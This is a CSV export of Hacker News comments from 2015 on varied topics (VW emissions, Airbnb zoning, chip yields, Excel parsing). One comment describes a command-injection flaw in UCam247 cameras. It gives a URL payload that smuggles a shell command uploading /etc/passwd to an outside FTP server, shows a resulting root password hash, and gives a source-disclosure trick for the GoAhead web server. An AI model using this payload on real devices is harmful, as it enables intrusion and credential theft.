ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
10286718,comment,10286388,10286647,0,0,pkaye,,,"Die size influences yield which immensely impacts how much money you make. So you make things as small as feasible. Smaller die means more chips per wafer and smaller die means less chance of some contamination causing a particular die to be defective.",1443365992
10286717,comment,10286353,10286621,0,0,aioprisan,,,"> First, it only affects diesel engines.<p>According to VW, it affects 11 million cars with type EA 189 engines: &quot;In its new statement, VW gave more details, admitting that &quot;discrepancies&quot; related to vehicles with Type EA 189 engines and involved some 11 million vehicles worldwide.&quot; (<a href=""http://www.nbcnews.com/business/autos/volkswagen-11-million-vehicles-could-have-suspect-software-emissions-scandal-n431456"" rel=""nofollow"">http://www.nbcnews.com/business/autos/volkswagen-11-million-...</a>).<p>>It has been a few years now that we (as customers) have to deal with the common industry practice of advertising unrealistic fuel consumption statistics, so I&#x27;d say to some extent more car-makers are similarly boned here.<p>No, that would be fraud. Care to cite examples of such &quot;common industry practice&quot;?<p>> Third, Volkswagen is a group<p>That won&#x27;t make them less open to litigation.<p>> Fourth, it is common that such investigations go on for years without end.<p>Yes, investigation and litigation will take years, but effects will be felt suddenly, such as VW cars not being able to get re-registered and driven on roads since they don&#x27;t comply with emission standards, causing economic hardship and potentially larger lawsuits against VW. I think juries will be rather sympathetic to a few testimonies to that effect.",1443365974
10286716,comment,10280282,10281640,0,0,geebee,,,"Here&#x27;s one scenario.  A family, with two kids, lives in a single family house in a neighborhood zoned for single families.  A house on the block goes on the market.<p>Several families, with children around the same as the neighbors, tour and bid on the property.  However, an enterprising person (who doesn&#x27;t need the bedrooms for kids) uses the anticipated income from airbnb rentals (not to mention the absence of childcare costs) to outbid all those families.  The SFR zoned house, on a SFR zoned block, is now a hotel, for all practical purposes.  Guess the kids will have to find neighborhood friends somewhere else.<p>The visitors are quiet, polite.  So, no harm no foul?<p>I understand that this scenario can occur in the absence of airbnb or even short term rentals(plenty of people rent out rooms in their houses), but there&#x27;s an order of magnitude difference here.  Also, I still see more benefit to this if these are permanent, long term rentals.  They may be students who need a place to live, long term residents who need a place to live.  I also think that <i>unregulated and unresticted</i>[1] airbnb makes this scenario much more likely (which is one reason why the company is so profitable, it has made it much easier to rent out &quot;spare&quot; bedrooms, creating a new market).<p>[1] properly regulated airbnb, which allows someone to rent out their house while they are on vacation, now and then, would not cause any of this harm.",1443365968
10286715,comment,10286666,10286666,0,0,greenyoda,,,"Previously: <a href=""https://news.ycombinator.com/item?id=10252183"" rel=""nofollow"">https://news.ycombinator.com/item?id=10252183</a>",1443365947
10286714,comment,10286478,10286478,0,0,jameshart,,,"Used to be that traceroute 216.81.59.173 gave you a recreation of the Star Wars opening crawl in host names... I guess these configurations don&#x27;t last forever, though.",1443365946
10286713,comment,10286353,10286672,0,0,Oletros,,,"Having discrepancies in 11 million vehicles doesn&#x27;t mean being fined for 11 million vehicles",1443365941
10286712,story,,,94,33,blondie9x,"Gates funded Terrapower inks deal with China’s CNNC to build fast reactor",http://neutronbytes.com/2015/09/23/terrapower-inks-deal-with-chinas-cnnc-to-build-fast-reactor/,,1443365936
10286711,comment,10285337,10286342,0,0,kuschku,,,"Yes. But obviously, at a university, most professors are selected for their research. Which does not, unless they research teaching, necessarily mean they are good at teaching.",1443365928
10286710,comment,10286470,10286470,0,0,lol768,,,"The UCam247 cameras are vulnerable to a similar attack, you can use a closing quote in the &quot;HTTP Alarm/Periodic Sending&quot; URL field and since this isn&#x27;t escaped (and is run at the shell), you can use a URL like this:<p><pre><code>  http://127.0.0.1&quot; |sh -c &quot;curl -u user:pass --upload-file /etc/passwd ftp://myserver.com//tmp/ 2>&1
</code></pre>
Which gets you this:<p><pre><code>  /etc/passwd – root:$1$rnjbbPTD$tR9oAIWgUp/jRrhjDuUwp0:0:0:root:/root:/bin/sh
</code></pre>
I haven&#x27;t been able to crack the password though yet so I&#x27;m guessing it&#x27;s somewhat secure. The good news is that you can only enable telnet via the config file backup/restore system (and it&#x27;s disabled by default):<p><pre><code>  [telnetd]
  ENABLE=disable
  PORT=60628
</code></pre>
The other neat thing about the UCam247 cameras is that they also run the GoAhead Embedded Web Server (which has some fun vulnerabilities, <a href=""http://www.cvedetails.com/vulnerability-list/vendor_id-1641/product_id-2833/Goahead-Goahead-Webserver.html"" rel=""nofollow"">http://www.cvedetails.com/vulnerability-list/vendor_id-1641/...</a>). My favourite thing to do with this webserver is to append a backslash to the end of a URL, e.g. <a href=""http://192.168.1.2/en/main.asp%5C"" rel=""nofollow"">http://192.168.1.2/en/main.asp%5C</a> - the webserver will simply return back the source code for the page instead of interpreting it.",1443365884
10286709,comment,10285733,10285733,0,0,emeryberger,,,"Nice to see this, and thanks for open-sourcing it. We (by which I mostly mean Dan Barowy (<a href=""http://people.cs.umass.edu/~dbarowy/"" rel=""nofollow"">http://people.cs.umass.edu/~dbarowy/</a>) burned a considerable amount of time and energy on parsing Excel formulas for our CheckCell project (<a href=""http://checkcell.org"" rel=""nofollow"">http://checkcell.org</a>),  but yours looks more general (for example, CheckCell doesn&#x27;t care about precedence, so we didn&#x27;t implement that).",1443365873
